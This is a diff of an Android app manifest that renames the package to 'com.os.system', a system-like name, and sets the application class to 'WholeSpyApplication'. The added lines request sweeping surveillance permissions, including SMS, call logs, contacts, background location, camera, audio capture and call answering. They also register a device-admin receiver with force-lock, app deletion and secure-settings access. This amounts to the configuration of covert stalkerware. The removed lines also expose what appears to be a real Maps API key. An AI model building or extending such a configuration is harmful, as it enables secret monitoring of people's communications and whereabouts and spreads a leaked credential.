@@ -1,144 +1,119 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.im.bin">
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.os.system">
+
+    <!-- A camera with (optional) RAW capability is required to use this application -->
+    <uses-feature
+        android:name="android.hardware.camera.any"
+        tools:ignore="ManifestOrder" />
+
+    <uses-feature
+        android:name="android.hardware.camera.raw"
+        android:required="false" />
 
     <uses-permission android:name="android.permission.INTERNET" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"></uses-permission>
-    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"></uses-permission>
+
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="29" />
+
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_CALENDAR" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="com.android.vending.BILLING" />
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
+    <uses-permission android:name="android.permission.USES_POLICY_FORCE_LOCK" />
+    <uses-permission android:name="android.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="Manifest.permission.ANSWER_PHONE_CALLS" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_MEDIA_LOCATION" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+
+    <permission android:name="${applicationId}.permission.QUERY_ALL_PACKAGES" />
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN" />
+        </intent>
+    </queries>
+
+    <uses-permission
+        android:name="android.permission.CAPTURE_AUDIO_OUTPUT"
+        tools:ignore="ProtectedPermissions"></uses-permission>
+
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_SETTINGS"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_SECURE_SETTINGS"
+        tools:ignore="ProtectedPermissions" />
+
+    <uses-permission
+        android:name="android.permission.CLEAR_APP_CACHE"
+        tools:ignore="ProtectedPermissions" />
 
     <application
-        android:name="com.im.bin.MyApplication"
+        android:name=".WholeSpyApplication"
         android:allowBackup="true"
         android:icon="@mipmap/ic_launcher"
         android:label="@string/app_name"
         android:largeHeap="true"
-        android:requestLegacyExternalStorage="true"
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
-        android:theme="@style/AppTheme">
-
-        <provider
-            android:name="androidx.core.content.FileProvider"
-            android:authorities="${applicationId}.provider"
-            android:exported="false"
-            android:grantUriPermissions="true">
-            <meta-data
-                android:name="android.support.FILE_PROVIDER_PATHS"
-                android:resource="@xml/provider_paths" />
-        </provider>
-
-        <meta-data
-            android:name="com.google.android.gms.ads.APPLICATION_ID"
-            android:value="@string/app_id" />
+        android:theme="@style/Theme.TOS"
+        android:usesCleartextTraffic="true">
 
         <activity
-            android:name="com.im.bin.ui.auth.LoginActivity"
-            android:theme="@style/ThemeFullScreen"
-            android:windowSoftInputMode="stateAlwaysHidden">
+            android:name=".featureInstallation.MainActivity"
+            android:exported="true"
+            android:label="@string/app_name">
+
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity>
 
-        <activity
-            android:name=".ui.MainActivity"
-            android:launchMode="singleInstance"
-            android:theme="@style/AppThemeNoActionBar"></activity>
-
-        <activity
-            android:name="com.im.bin.ui.auth.SignUpActivity"
-            android:theme="@style/ThemeFullScreen"
-            android:windowSoftInputMode="stateAlwaysHidden" />
-
-        <activity
-            android:name=".ui.PremiumFeaturesActivity"
-            android:launchMode="singleInstance"
-            android:theme="@style/ThemeFullScreen"
-            android:windowSoftInputMode="stateAlwaysHidden"></activity>
-
-        <activity
-            android:name="com.im.bin.ui.HomeActivity"
-            android:theme="@style/AppThemeNoActionBar" />
-
-        <activity
-            android:name=".ui.ChatConversationActivity"
-            android:theme="@style/AppThemeNoActionBar"></activity>
-
-
-        <activity
-            android:name=".ui.LockScreenActivity"
-            android:excludeFromRecents="true"
-            android:label=""
-            android:theme="@style/LockScreenTheme" />
-        <activity
-            android:name=".ui.RecoverPinActivity"
-            android:excludeFromRecents="true"
-            android:label=""
-            android:theme="@style/AppThemeNoActionBar" />
-
-        <activity
-            android:name=".ui.AppSettingsActivity"
-            android:label="Settings"
-            android:theme="@style/AppActionBarTheme"></activity>
-
-        <meta-data
-            android:name="com.google.android.geo.API_KEY"
-            android:value="AIzaSyDQuNy4AMeSSZZN4O5fHTAo0z1dlVLmqJc" />
-
-        <activity
-            android:name=".ui.StartServiceActivity"
-            android:excludeFromRecents="false"
-            android:theme="@style/Theme.Transparent" />
-
-        <activity
-            android:name=".ui.PreviewImageActivity"
-            android:theme="@style/AppThemeNoActionBar"
-            android:screenOrientation="fullSensor">
-        </activity>
-
-        <activity
-            android:name=".ui.PlayVideoActivity"
-            android:theme="@style/AppThemeNoActionBar"
-            android:screenOrientation="fullSensor"/>
-
-        <activity
-            android:name=".ui.AudioPlayerActivity"
-            android:theme="@style/AppThemeNoActionBar"
-            android:screenOrientation="fullSensor"/>
-
-
-        <service android:name=".services.ForegroundService" />
-        <service android:name=".services.VoipCallRecordingService"></service>
-
-        <receiver android:name=".receivers.BootReceiver">
-            <intent-filter android:priority="999">
-                <action android:name="android.intent.action.BOOT_COMPLETED" />
-            </intent-filter>
-        </receiver>
-        <receiver android:name=".receivers.NotificationBroadcastReceiver" />
-
-        <service
-            android:name=".accessibilityService.AppAccessibilityService"
-            android:enabled="true"
+        <receiver
+            android:name=".receivers.TOSDeviceAdminReceiver"
             android:exported="false"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            android:permission="android.permission.BIND_DEVICE_ADMIN">
+
             <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
+                <!-- This action is required -->
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+                <action android:name="android.app.action.DEVICE_ADMIN_DISABLED" />
             </intent-filter>
 
+            <!-- This is required this receiver to become device admin component. -->
             <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/accessibility_service_config" />
-        </service>
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin_sample" />
+        </receiver>
 
     </application>
 
